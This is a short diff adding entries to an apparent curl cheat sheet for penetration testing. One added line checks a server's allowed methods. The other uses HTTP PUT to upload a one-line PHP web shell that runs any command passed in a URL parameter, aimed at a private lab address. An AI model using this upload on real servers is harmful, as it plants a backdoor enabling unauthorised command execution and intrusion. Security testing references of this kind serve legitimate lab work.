@@ -187,4 +187,6 @@ curl -I
 curl -x http://10.10.10.10:8080 -L http://sample.com (Local Proxy)
 curl -v https://google.com (Testing a connection to a remote site)
 curl -I -H 'Accept-Encoding: gzip,deflate' http://example.com/index.php (Checking Header)
+curl -v -X OPTIONS http://192.168.56.103 (Check OPTIONS)
+curl -X PUT -d '<?php system($_GET["c"]);' http://192.168.200.150/1.php
 ```
